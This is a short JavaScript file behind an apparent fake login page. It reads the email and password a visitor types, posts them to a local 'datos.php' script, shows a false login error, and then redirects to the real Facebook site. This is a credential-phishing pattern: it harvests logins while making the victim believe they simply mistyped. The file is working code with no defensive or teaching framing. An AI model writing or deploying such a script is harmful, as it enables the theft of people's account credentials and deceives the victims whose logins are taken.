$(document).ready(function () {
    var inputEmail = $('#inputEmail')[0];
    var inputPassword = $('#inputPassword')[0];
    var error = document.getElementById('alertaError');
    error.style.display = 'none'

    $('#btnIniciarSession').click(function (e) {
        e.preventDefault();

        let formData = new FormData();
        formData.append('email', inputEmail.value);
        formData.append('password', inputPassword.value);

        if (inputEmail.value === '' || inputPassword.value === '') {
            alert('los campos deben de estar rellenados');

        } else {
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function () {
                if (xhttp.readyState === 4 && xhttp.status === 200) {
                    let input = document.getElementById('inputEmail');
                    setTimeout(() => {
                        input.style.border = '1px solid red'
                        error.style.display = 'block'
                    }, 3100);

                    setTimeout(() => {
                        console.log(xhttp.response);
                        location.href = 'https://es-la.facebook.com/';
                    }, 5000);
                }
            }
            xhttp.open('POST','../php/datos.php');
            xhttp.send(formData);
        }
    });
})